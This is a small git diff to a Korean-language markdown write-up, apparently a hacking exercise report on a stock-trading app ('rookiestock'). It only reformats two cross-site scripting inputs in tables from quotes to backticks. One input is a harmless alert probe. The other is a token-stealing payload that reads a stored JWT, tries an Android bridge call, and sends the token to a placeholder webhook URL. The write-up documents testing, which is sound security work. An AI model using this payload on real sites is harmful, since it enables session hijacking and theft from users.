@@ -387,7 +387,7 @@ echo "
 
 | 입력 구문 |
 |---------|
-| "<script>alert('test');</script>" |
+| `<script>alert('test');</script>` |
 
 > <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/8d473a6c-03bf-4fa5-8445-cc601bde1c49">
 > <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/e6d8147d-bedc-45fe-8aa4-1c1dee666fef">
@@ -397,7 +397,7 @@ echo "
 
 | 입력 구문 |
 |---------|
-| "<script>let token = window.localStorage.getItem(“SKJWTToken”); let url = “[webhook site url]” try{token=Android.getToken();}catch{}fetch(url+”?name=SKJWTToken&token=”+token);</script>" |
+| `<script>let token = window.localStorage.getItem(“SKJWTToken”); let url = “[webhook site url]” try{token=Android.getToken();}catch{}fetch(url+”?name=SKJWTToken&token=”+token);</script>` |
 
 > <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/8bd89b09-b393-4bda-b2ca-e0419c48f3b3">
 
